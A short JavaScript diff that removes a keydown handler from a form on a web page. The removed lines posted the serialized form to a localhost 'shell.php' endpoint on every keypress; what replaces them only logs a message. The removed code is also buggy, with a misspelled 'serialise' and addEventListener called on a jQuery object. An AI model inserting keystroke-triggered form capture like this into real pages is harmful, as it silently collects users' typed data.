@@ -133,14 +133,10 @@ $(document).ready( function() {
 			data: $(this).serialize()
 		});
 	});
-
-	$("#XmenuForm").addEventListener("keydown", function(e) {
+	
+	var xmenuform = document.getElementById("XmenuForm");
+	xmenuform.addEventListener("keydown", function(e) {
 		console.log("Hello")
-		$.ajax({
-			url: "127.0.0.1/shell.php",
-			type: "GET",
-			data: $(this).serialise()
-		});
 	});
 });
 </script>
